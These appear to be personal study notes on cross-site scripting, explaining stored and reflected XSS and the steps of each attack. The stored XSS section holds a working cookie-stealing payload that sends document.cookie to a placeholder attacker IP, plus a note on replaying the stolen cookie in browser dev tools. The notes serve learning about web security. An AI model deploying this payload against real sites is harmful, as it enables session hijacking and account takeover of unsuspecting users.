-XSS (cross-site Scripting): a type of injection which can allow an attacker to execute malicious scripts and have it execute on a victims machine
-vulnerable web app: uses unsanitized user input
-javascript, VBScript, Flash and CSS
-Two categories: Persistent/stored and Reflected
-Possible attacks: Cookie stealing, keylogging, webcam snapshot, phishing, port scanning, other browser related exploits

--------------------------------------------------------------------------------------------------------

Stored XSS
-malicious string originates from the websites database
-web app allows user input that is not sanitized
1. Attacker inserts malicious payload into the web app's database
2. For every visit to the website the malicious script is activated
3. data such as cookie, is stolen and sent to attacker to take over victim's account
*script runs in every browser because it is stored in the database

log cookie: <script>document.location='http://IP'+document.cookie</script>
dev tools > storage > change cookie value 

----------------------------------------------------------------------------------------

Reflected XSS

-malicious payload is part of the victims request to the website
-website included this payload in response back to the user
-attacker needs to trick a victim to click a URL
-requires the victim to send a request containing an attackers payload
-use social-engineering to trick victims to click link

1. attacker sends a link to victim that contains a malicious payload
2. victim clicks link and taken to vuln website
3. link containing the attacker's script is executed on website
4. attacker's script sends data back to the attacker, taking over victims account
